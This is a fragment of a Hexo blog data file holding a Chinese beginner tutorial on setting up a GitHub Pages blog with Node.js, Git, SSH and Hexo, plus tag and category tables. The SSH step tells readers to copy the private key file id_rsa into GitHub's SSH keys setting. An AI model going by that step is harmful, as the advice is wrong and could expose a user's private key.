href=\"#2-下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！\" class=\"headerlink\" title=\"2.下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！!\"></a>2.下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！!<img src=\"https://img-blog.csdnimg.cn/20200211104548998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h1 id=\"2-GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）\"><a href=\"#2-GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）\" class=\"headerlink\" title=\"2.GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）\"></a>2.GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）</h1><h1 id=\"3-git-for-Windows的安装！\"><a href=\"#3-git-for-Windows的安装！\" class=\"headerlink\" title=\"3.git for Windows的安装！\"></a>3.git for Windows的安装！</h1><h3 id=\"百度搜索并且安装就完事了\"><a href=\"#百度搜索并且安装就完事了\" class=\"headerlink\" title=\"百度搜索并且安装就完事了!\"></a>百度搜索并且安装就完事了!</h3><h1 id=\"4-配置GitHub-SSH！\"><a href=\"#4-配置GitHub-SSH！\" class=\"headerlink\" title=\"4.配置GitHub SSH！\"></a>4.配置GitHub SSH！</h1><h3 id=\"1-在你git-for-windows-的安装路径下的文件夹内找到-git-bash-exe，运行。\"><a href=\"#1-在你git-for-windows-的安装路径下的文件夹内找到-git-bash-exe，运行。\" class=\"headerlink\" title=\"1.在你git for windows 的安装路径下的文件夹内找到          git-bash.exe，运行。\"></a>1.在你git for windows 的安装路径下的文件夹内找到          git-bash.exe，运行。</h3><h3 id=\"2-输入ssh-keygen-t-rsa-C-“自己的邮箱”，会生成一段密钥，及密钥所在路径。在-ssh中id-rsa的文件内用记事本打开，复制下来。\"><a href=\"#2-输入ssh-keygen-t-rsa-C-“自己的邮箱”，会生成一段密钥，及密钥所在路径。在-ssh中id-rsa的文件内用记事本打开，复制下来。\" class=\"headerlink\" title=\"2.输入ssh-keygen -t  rsa      -C “自己的邮箱”，会生成一段密钥，及密钥所在路径。在.ssh中id-rsa的文件内用记事本打开，复制下来。\"></a>2.输入ssh-keygen -t  rsa      -C “自己的邮箱”，会生成一段密钥，及密钥所在路径。在.ssh中id-rsa的文件内用记事本打开，复制下来。</h3><h3 id=\"3-登录你的GitHub，进入设置，找到SSH-keys。把刚刚复制的密钥粘贴下来，就行了。\"><a href=\"#3-登录你的GitHub，进入设置，找到SSH-keys。把刚刚复制的密钥粘贴下来，就行了。\" class=\"headerlink\" title=\"3.登录你的GitHub，进入设置，找到SSH keys。把刚刚复制的密钥粘贴下来，就行了。\"></a>3.登录你的GitHub，进入设置，找到SSH keys。把刚刚复制的密钥粘贴下来，就行了。</h3><h1 id=\"5-hexo的安装及使用。\"><a href=\"#5-hexo的安装及使用。\" class=\"headerlink\" title=\"5.hexo的安装及使用。\"></a>5.hexo的安装及使用。</h1><h3 id=\"1-在D盘内创建一个新文件夹-我的是blog-，以便于后边的hexo的本地安装。\"><a href=\"#1-在D盘内创建一个新文件夹-我的是blog-，以便于后边的hexo的本地安装。\" class=\"headerlink\" title=\"1.在D盘内创建一个新文件夹(我的是blog)，以便于后边的hexo的本地安装。\"></a>1.在D盘内创建一个新文件夹(我的是blog)，以便于后边的hexo的本地安装。</h3><h3 id=\"2-打开cmd命令行，cd-blog回车-然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm-install-g-cnpm-–registry-https-registry-npm-taobao-org，这个会提高下载速度。\"><a href=\"#2-打开cmd命令行，cd-blog回车-然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm-install-g-cnpm-–registry-https-registry-npm-taobao-org，这个会提高下载速度。\" class=\"headerlink\" title=\"2.打开cmd命令行，cd blog回车,然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm install -g cnpm –registry=https://registry.npm.taobao.org，这个会提高下载速度。\"></a>2.打开cmd命令行，cd blog回车,然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm install -g cnpm –registry=<a href=\"https://registry.npm.taobao.org，这个会提高下载速度。\" target=\"_blank\" rel=\"noopener\">https://registry.npm.taobao.org，这个会提高下载速度。</a></h3><h3 id=\"3-按照官网的使用命令教程一步步进行。\"><a href=\"#3-按照官网的使用命令教程一步步进行。\" class=\"headerlink\" title=\"3.按照官网的使用命令教程一步步进行。\"></a>3.按照官网的使用命令教程一步步进行。<img src=\"https://img-blog.csdnimg.cn/20200211114359163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h3 id=\"4-安装好后本地运行，local-host：5555，就可以看到自己的博客了。（是不是很激动）\"><a href=\"#4-安装好后本地运行，local-host：5555，就可以看到自己的博客了。（是不是很激动）\" class=\"headerlink\" title=\"4.安装好后本地运行，local host：5555，就可以看到自己的博客了。（是不是很激动）\"></a>4.安装好后本地运行，local host：5555，就可以看到自己的博客了。（是不是很激动）</h3><h1 id=\"6-安装sublime-text。\"><a href=\"#6-安装sublime-text。\" class=\"headerlink\" title=\"6.安装sublime text。\"></a>6.安装sublime text。</h1><h3 id=\"1-安装后直接打开，并将自己的博客目录拖进sublime-text。\"><a href=\"#1-安装后直接打开，并将自己的博客目录拖进sublime-text。\" class=\"headerlink\" title=\"1.安装后直接打开，并将自己的博客目录拖进sublime text。\"></a>1.安装后直接打开，并将自己的博客目录拖进sublime text。</h3><h3 id=\"2-自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。\"><a href=\"#2-自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。\" class=\"headerlink\" title=\"2.自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。\"></a>2.自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。</h3><h3 id=\"注意：sublime-text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。\"><a href=\"#注意：sublime-text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。\" class=\"headerlink\" title=\"注意：sublime text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。\"></a><em>注意：sublime text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。</em><img src=\"https://img-blog.csdnimg.cn/20200211115507522.png\" alt=\"在这里插入图片描述\"></h3><h1 id=\"7-hexo发布前的准备。\"><a href=\"#7-hexo发布前的准备。\" class=\"headerlink\" title=\"7.hexo发布前的准备。\"></a>7.hexo发布前的准备。</h1><h3 id=\"1-去hexo官网安装插件，否则会报错哟。安装成功的标志。\"><a href=\"#1-去hexo官网安装插件，否则会报错哟。安装成功的标志。\" class=\"headerlink\" title=\"1.去hexo官网安装插件，否则会报错哟。安装成功的标志。\"></a>1.去hexo官网安装插件，否则会报错哟。安装成功的标志。<img src=\"https://img-blog.csdnimg.cn/20200211120921962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h3 id=\"2-config-yml中的url更改为自己的博客站点，还有作者的名字。\"><a href=\"#2-config-yml中的url更改为自己的博客站点，还有作者的名字。\" class=\"headerlink\" title=\"2.config.yml中的url更改为自己的博客站点，还有作者的名字。\"></a>2.config.yml中的url更改为自己的博客站点，还有作者的名字。<img src=\"https://img-blog.csdnimg.cn/20200211120941355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h3 id=\"3-最后面的配置也不能忘！注意：（repo：自己的GitHub博客仓库地址）\"><a href=\"#3-最后面的配置也不能忘！注意：（repo：自己的GitHub博客仓库地址）\" class=\"headerlink\" title=\"3.最后面的配置也不能忘！注意：（repo：自己的GitHub博客仓库地址）\"></a>3.最后面的配置也不能忘！<em>注意：（repo：自己的GitHub博客仓库地址）</em><img src=\"https://img-blog.csdnimg.cn/20200211121457874.png\" alt=\"在这里插入图片描述\"></h3><h3 id=\"4-然后先hexo-g生成，再hexo-d再提交，并配置博客信息。\"><a href=\"#4-然后先hexo-g生成，再hexo-d再提交，并配置博客信息。\" class=\"headerlink\" title=\"4.然后先hexo g生成，再hexo d再提交，并配置博客信息。\"></a>4.然后先hexo g生成，再hexo d再提交，并配置博客信息。<img src=\"https://img-blog.csdnimg.cn/20200211121852741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h3 id=\"5-输入成功后会让你登录GitHub的博客。\"><a href=\"#5-输入成功后会让你登录GitHub的博客。\" class=\"headerlink\" title=\"5.输入成功后会让你登录GitHub的博客。\"></a>5.输入成功后会让你登录GitHub的博客。</h3><p><img src=\"https://img-blog.csdnimg.cn/2020021112224291.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"自此博客创建成功了！！！开心呀。\"><a href=\"#自此博客创建成功了！！！开心呀。\" class=\"headerlink\" title=\"自此博客创建成功了！！！开心呀。\"></a>自此博客创建成功了！！！开心呀。</h1>","site":{"data":{}},"excerpt":"","more":"<hr>\n<p>title: GitHub博客搭建<br>date: 2020-03-01 15:04:05<br>tags: 博客搭建<br>categories: 技术<br>photos: <a href=\"https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(6).jpg.webp\" target=\"_blank\" rel=\"noopener\">https://cdn.jsdelivr.net/gh/yremp/cdn@2.1.5/img/cover/(6).jpg.webp</a></p>\n<p>​—</p>\n<p>GitHub搭建成功有段时间了，期间自己也遇到过很多问题，换过logo，主题，头像，虽然困难很多但总有解决的办法 ，让我骄傲的分享一下搭建的过程！</p>\n<h1 id=\"1-安装node\"><a href=\"#1-安装node\" class=\"headerlink\" title=\"1.安装node!!!\"></a>1.安装node!!!</h1><h3 id=\"1-在百度搜索Node-js-去官网下载最新稳定版本！下载的过程有点慢，不要着急。\"><a href=\"#1-在百度搜索Node-js-去官网下载最新稳定版本！下载的过程有点慢，不要着急。\" class=\"headerlink\" title=\"1.在百度搜索Node.js,去官网下载最新稳定版本！下载的过程有点慢，不要着急。\"></a>1.在百度搜索Node.js,去官网下载最新稳定版本！下载的过程有点慢，不要着急。</h3><h3 id=\"2-下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！\"><a href=\"#2-下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！\" class=\"headerlink\" title=\"2.下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！!\"></a>2.下载并且安装后，打开CMD命令行，输入node-v，会显示出你安装的版本信息，并且你知道你安装成功了！在这里我建议你们都输入一下试试，我就是没有试试，到搭建后期才发现node安装失败了！！！!<img src=\"https://img-blog.csdnimg.cn/20200211104548998.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h1 id=\"2-GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）\"><a href=\"#2-GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）\" class=\"headerlink\" title=\"2.GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）\"></a>2.GitHub的注册（这个过程没有什么困难就一笔代过了，不过说这个官网超级慢，慢慢来就行了）</h1><h1 id=\"3-git-for-Windows的安装！\"><a href=\"#3-git-for-Windows的安装！\" class=\"headerlink\" title=\"3.git for Windows的安装！\"></a>3.git for Windows的安装！</h1><h3 id=\"百度搜索并且安装就完事了\"><a href=\"#百度搜索并且安装就完事了\" class=\"headerlink\" title=\"百度搜索并且安装就完事了!\"></a>百度搜索并且安装就完事了!</h3><h1 id=\"4-配置GitHub-SSH！\"><a href=\"#4-配置GitHub-SSH！\" class=\"headerlink\" title=\"4.配置GitHub SSH！\"></a>4.配置GitHub SSH！</h1><h3 id=\"1-在你git-for-windows-的安装路径下的文件夹内找到-git-bash-exe，运行。\"><a href=\"#1-在你git-for-windows-的安装路径下的文件夹内找到-git-bash-exe，运行。\" class=\"headerlink\" title=\"1.在你git for windows 的安装路径下的文件夹内找到          git-bash.exe，运行。\"></a>1.在你git for windows 的安装路径下的文件夹内找到          git-bash.exe，运行。</h3><h3 id=\"2-输入ssh-keygen-t-rsa-C-“自己的邮箱”，会生成一段密钥，及密钥所在路径。在-ssh中id-rsa的文件内用记事本打开，复制下来。\"><a href=\"#2-输入ssh-keygen-t-rsa-C-“自己的邮箱”，会生成一段密钥，及密钥所在路径。在-ssh中id-rsa的文件内用记事本打开，复制下来。\" class=\"headerlink\" title=\"2.输入ssh-keygen -t  rsa      -C “自己的邮箱”，会生成一段密钥，及密钥所在路径。在.ssh中id-rsa的文件内用记事本打开，复制下来。\"></a>2.输入ssh-keygen -t  rsa      -C “自己的邮箱”，会生成一段密钥，及密钥所在路径。在.ssh中id-rsa的文件内用记事本打开，复制下来。</h3><h3 id=\"3-登录你的GitHub，进入设置，找到SSH-keys。把刚刚复制的密钥粘贴下来，就行了。\"><a href=\"#3-登录你的GitHub，进入设置，找到SSH-keys。把刚刚复制的密钥粘贴下来，就行了。\" class=\"headerlink\" title=\"3.登录你的GitHub，进入设置，找到SSH keys。把刚刚复制的密钥粘贴下来，就行了。\"></a>3.登录你的GitHub，进入设置，找到SSH keys。把刚刚复制的密钥粘贴下来，就行了。</h3><h1 id=\"5-hexo的安装及使用。\"><a href=\"#5-hexo的安装及使用。\" class=\"headerlink\" title=\"5.hexo的安装及使用。\"></a>5.hexo的安装及使用。</h1><h3 id=\"1-在D盘内创建一个新文件夹-我的是blog-，以便于后边的hexo的本地安装。\"><a href=\"#1-在D盘内创建一个新文件夹-我的是blog-，以便于后边的hexo的本地安装。\" class=\"headerlink\" title=\"1.在D盘内创建一个新文件夹(我的是blog)，以便于后边的hexo的本地安装。\"></a>1.在D盘内创建一个新文件夹(我的是blog)，以便于后边的hexo的本地安装。</h3><h3 id=\"2-打开cmd命令行，cd-blog回车-然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm-install-g-cnpm-–registry-https-registry-npm-taobao-org，这个会提高下载速度。\"><a href=\"#2-打开cmd命令行，cd-blog回车-然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm-install-g-cnpm-–registry-https-registry-npm-taobao-org，这个会提高下载速度。\" class=\"headerlink\" title=\"2.打开cmd命令行，cd blog回车,然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm install -g cnpm –registry=https://registry.npm.taobao.org，这个会提高下载速度。\"></a>2.打开cmd命令行，cd blog回车,然后输入官网安装命令，安装过程有点超级慢，如果不行的话使用npm install -g cnpm –registry=<a href=\"https://registry.npm.taobao.org，这个会提高下载速度。\" target=\"_blank\" rel=\"noopener\">https://registry.npm.taobao.org，这个会提高下载速度。</a></h3><h3 id=\"3-按照官网的使用命令教程一步步进行。\"><a href=\"#3-按照官网的使用命令教程一步步进行。\" class=\"headerlink\" title=\"3.按照官网的使用命令教程一步步进行。\"></a>3.按照官网的使用命令教程一步步进行。<img src=\"https://img-blog.csdnimg.cn/20200211114359163.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h3 id=\"4-安装好后本地运行，local-host：5555，就可以看到自己的博客了。（是不是很激动）\"><a href=\"#4-安装好后本地运行，local-host：5555，就可以看到自己的博客了。（是不是很激动）\" class=\"headerlink\" title=\"4.安装好后本地运行，local host：5555，就可以看到自己的博客了。（是不是很激动）\"></a>4.安装好后本地运行，local host：5555，就可以看到自己的博客了。（是不是很激动）</h3><h1 id=\"6-安装sublime-text。\"><a href=\"#6-安装sublime-text。\" class=\"headerlink\" title=\"6.安装sublime text。\"></a>6.安装sublime text。</h1><h3 id=\"1-安装后直接打开，并将自己的博客目录拖进sublime-text。\"><a href=\"#1-安装后直接打开，并将自己的博客目录拖进sublime-text。\" class=\"headerlink\" title=\"1.安装后直接打开，并将自己的博客目录拖进sublime text。\"></a>1.安装后直接打开，并将自己的博客目录拖进sublime text。</h3><h3 id=\"2-自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。\"><a href=\"#2-自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。\" class=\"headerlink\" title=\"2.自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。\"></a>2.自己博客目录里的source文件夹post文件夹是以后我们发布博客要用的，themes文件夹是我们更换主题要用的。</h3><h3 id=\"注意：sublime-text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。\"><a href=\"#注意：sublime-text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。\" class=\"headerlink\" title=\"注意：sublime text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。\"></a><em>注意：sublime text中更改文件时要记住冒号后面要加上一个空格，才能输入你要更改的内容。否则会出现如下的错误。</em><img src=\"https://img-blog.csdnimg.cn/20200211115507522.png\" alt=\"在这里插入图片描述\"></h3><h1 id=\"7-hexo发布前的准备。\"><a href=\"#7-hexo发布前的准备。\" class=\"headerlink\" title=\"7.hexo发布前的准备。\"></a>7.hexo发布前的准备。</h1><h3 id=\"1-去hexo官网安装插件，否则会报错哟。安装成功的标志。\"><a href=\"#1-去hexo官网安装插件，否则会报错哟。安装成功的标志。\" class=\"headerlink\" title=\"1.去hexo官网安装插件，否则会报错哟。安装成功的标志。\"></a>1.去hexo官网安装插件，否则会报错哟。安装成功的标志。<img src=\"https://img-blog.csdnimg.cn/20200211120921962.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h3 id=\"2-config-yml中的url更改为自己的博客站点，还有作者的名字。\"><a href=\"#2-config-yml中的url更改为自己的博客站点，还有作者的名字。\" class=\"headerlink\" title=\"2.config.yml中的url更改为自己的博客站点，还有作者的名字。\"></a>2.config.yml中的url更改为自己的博客站点，还有作者的名字。<img src=\"https://img-blog.csdnimg.cn/20200211120941355.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h3 id=\"3-最后面的配置也不能忘！注意：（repo：自己的GitHub博客仓库地址）\"><a href=\"#3-最后面的配置也不能忘！注意：（repo：自己的GitHub博客仓库地址）\" class=\"headerlink\" title=\"3.最后面的配置也不能忘！注意：（repo：自己的GitHub博客仓库地址）\"></a>3.最后面的配置也不能忘！<em>注意：（repo：自己的GitHub博客仓库地址）</em><img src=\"https://img-blog.csdnimg.cn/20200211121457874.png\" alt=\"在这里插入图片描述\"></h3><h3 id=\"4-然后先hexo-g生成，再hexo-d再提交，并配置博客信息。\"><a href=\"#4-然后先hexo-g生成，再hexo-d再提交，并配置博客信息。\" class=\"headerlink\" title=\"4.然后先hexo g生成，再hexo d再提交，并配置博客信息。\"></a>4.然后先hexo g生成，再hexo d再提交，并配置博客信息。<img src=\"https://img-blog.csdnimg.cn/20200211121852741.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ1ODY5MDM5,size_16,color_FFFFFF,t_70\" alt=\"在这里插入图片描述\"></h3><h3 id=\"5-输入成功后会让你登录GitHub的博客。\"><a href=\"#5-输入成功后会让你登录GitHub的博客。\" class=\"headerlink\" title=\"5.输入成功后会让你登录GitHub的博客。\"></a>5.输入成功后会让你登录GitHub的博客。</h3><p><img src=\"https://img-blog.csdnimg.cn/2020021112224291.png\" alt=\"在这里插入图片描述\"></p>\n<h1 id=\"自此博客创建成功了！！！开心呀。\"><a href=\"#自此博客创建成功了！！！开心呀。\" class=\"headerlink\" title=\"自此博客创建成功了！！！开心呀。\"></a>自此博客创建成功了！！！开心呀。</h1>"}],"PostAsset":[],"PostCategory":[{"post_id":"ckchhpsgn00069kq69nl5ffpf","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpsgu000d9kq6820qak8q"},{"post_id":"ckchhpsfz00009kq650nv87wf","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpsgx000i9kq65t2samhr"},{"post_id":"ckchhpsgp00079kq62qm5aiu6","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpsgz000l9kq632hr0d60"},{"post_id":"ckchhpsgs000b9kq638jial1f","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpsh1000o9kq6aobz2kaz"},{"post_id":"ckchhpsg700029kq6fdih6cos","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpsh3000r9kq6f9ey7398"},{"post_id":"ckchhpsgu000c9kq61act0nl2","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpsh5000v9kq6fynlddw8"},{"post_id":"ckchhpsgw000h9kq6g017dmt8","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpsh7000y9kq6a5cf5rqe"},{"post_id":"ckchhpsgl00059kq62x70965q","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpsh800119kq6enyh0f7y"},{"post_id":"ckchhpsgy000k9kq67whh822i","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpsha00159kq65o1y93xl"},{"post_id":"ckchhpsh0000n9kq6ced56z3u","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpshc00189kq684fvefy1"},{"post_id":"ckchhpsh2000q9kq66mos77ch","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpshe001c9kq6htw822ak"},{"post_id":"ckchhpsh4000u9kq63p9y4tgr","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpshf001f9kq6go45b7f4"},{"post_id":"ckchhpsh6000x9kq6cssxe42f","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpshh001j9kq65foqai0b"},{"post_id":"ckchhpsh800109kq6hi6a0qxa","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpshi001m9kq66ai7e2zr"},{"post_id":"ckchhpsha00149kq6ekt21tki","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpshk001q9kq6bog13m4k"},{"post_id":"ckchhpshb00179kq6a3m9cb4t","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpshk001s9kq6g4apejqp"},{"post_id":"ckchhpshd001b9kq6ff1g9fxd","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpshl001w9kq681pf33ao"},{"post_id":"ckchhpshf001e9kq6eo7re1qc","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpshm001y9kq6210z1v0y"},{"post_id":"ckchhpshg001i9kq6d4zwfxuu","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpshm00209kq6hfnfgs2h"},{"post_id":"ckchhpshi001l9kq6ga4d891m","category_id":"ckchhpsg900039kq65riae4uc","_id":"ckchhpshn00239kq62ytx2l4t"},{"post_id":"ckchhpshj001p9kq63uc6c2p4","category_id":"ckchhpshl001u9kq6apubeoev","_id":"ckchhpshn00249kq6dpawb3ro"}],"PostTag":[{"post_id":"ckchhpsfz00009kq650nv87wf","tag_id":"ckchhpsgb00049kq6bd146vub","_id":"ckchhpsgr000a9kq60il32jbs"},{"post_id":"ckchhpsgs000b9kq638jial1f","tag_id":"ckchhpsgq00099kq6b0nvgk8s","_id":"ckchhpsgw000g9kq61zxi5n0g"},{"post_id":"ckchhpsg700029kq6fdih6cos","tag_id":"ckchhpsgq00099kq6b0nvgk8s","_id":"ckchhpsgy000j9kq666gr2jqi"},{"post_id":"ckchhpsgl00059kq62x70965q","tag_id":"ckchhpsgv000f9kq685iu66ly","_id":"ckchhpsh1000p9kq65m8r09th"},{"post_id":"ckchhpsgy000k9kq67whh822i","tag_id":"ckchhpsgq00099kq6b0nvgk8s","_id":"ckchhpsh3000s9kq69rib6co0"},{"post_id":"ckchhpsh0000n9kq6ced56z3u","tag_id":"ckchhpsgq00099kq6b0nvgk8s","_id":"ckchhpsh6000w9kq68z6l3eud"},{"post_id":"ckchhpsgn00069kq69nl5ffpf","tag_id":"ckchhpsh0000m9kq602vk6e1b","_id":"ckchhpsh7000z9kq65tt7fljj"},{"post_id":"ckchhpsh2000q9kq66mos77ch","tag_id":"ckchhpsgq00099kq6b0nvgk8s","_id":"ckchhpsh900139kq6bkhj32b2"},{"post_id":"ckchhpsh4000u9kq63p9y4tgr","tag_id":"ckchhpsgq00099kq6b0nvgk8s","_id":"ckchhpshb00169kq6dg91alze"},{"post_id":"ckchhpsh6000x9kq6cssxe42f","tag_id":"ckchhpsh0000m9kq602vk6e1b","_id":"ckchhpshd001a9kq67yaw7foy"},{"post_id":"ckchhpsgp00079kq62qm5aiu6","tag_id":"ckchhpsh4000t9kq60xwk44ds","_id":"ckchhpshe001d9kq69z5m66zt"},{"post_id":"ckchhpsha00149kq6ekt21tki","tag_id":"ckchhpsgq00099kq6b0nvgk8s","_id":"ckchhpshg001h9kq68zw32u83"},{"post_id":"ckchhpsgu000c9kq61act0nl2","tag_id":"ckchhpsh0000m9kq602vk6e1b","_id":"ckchhpshh001k9kq64dogb640"},{"post_id":"ckchhpsgw000h9kq6g017dmt8","tag_id":"ckchhpshc00199kq63omq0vp0","_id":"ckchhpshj001n9kq689tifey7"},{"post_id":"ckchhpshg001i9kq6d4zwfxuu","tag_id":"ckchhpsh0000m9kq602vk6e1b","_id":"ckchhpshk001r9kq6fhsu5fw0"},{"post_id":"ckchhpsh800109kq6hi6a0qxa","tag_id":"ckchhpshf001g9kq61lcqfkm8","_id":"ckchhpshl001t9kq6fg6oe3d8"},{"post_id":"ckchhpshi001l9kq6ga4d891m","tag_id":"ckchhpshc00199kq63omq0vp0","_id":"ckchhpshm001x9kq6hg96ev9r"},{"post_id":"ckchhpshb00179kq6a3m9cb4t","tag_id":"ckchhpshj001o9kq65e622m3r","_id":"ckchhpshm001z9kq66ys60rgu"},{"post_id":"ckchhpshd001b9kq6ff1g9fxd","tag_id":"ckchhpshl001v9kq6agwfhb01","_id":"ckchhpshn00229kq6g9fpfjmi"},{"post_id":"ckchhpshf001e9kq6eo7re1qc","tag_id":"ckchhpshj001o9kq65e622m3r","_id":"ckchhpsho00269kq6af7pgbbb"},{"post_id":"ckchhpshj001p9kq63uc6c2p4","tag_id":"ckchhpshn00259kq607yr9squ","_id":"ckchhpsho00279kq6dtsm3c3x"}],"Tag":[{"name":"c++学习","_id":"ckchhpsgb00049kq6bd146vub"},{"name":"php学习","_id":"ckchhpsgq00099kq6b0nvgk8s"},{"name":"web","_id":"ckchhpsgv000f9kq685iu66ly"},{"name":"SQL注入","_id":"ckchhpsh0000m9kq602vk6e1b"},{"name":"kail","_id":"ckchhpsh4000t9kq60xwk44ds"},{"name":"靶场","_id":"ckchhpshc00199kq63omq0vp0"},{"name":"zip知识学习","_id":"ckchhpshf001g9kq61lcqfkm8"},{"name":"练习","_id":"ckchhpshj001o9kq65e622m3r"},{"name":"其他","_id":"ckchhpshl001v9kq6agwfhb01"},{"name":"琐事","_id":"ckchhpshn00259kq607yr9squ"}]}}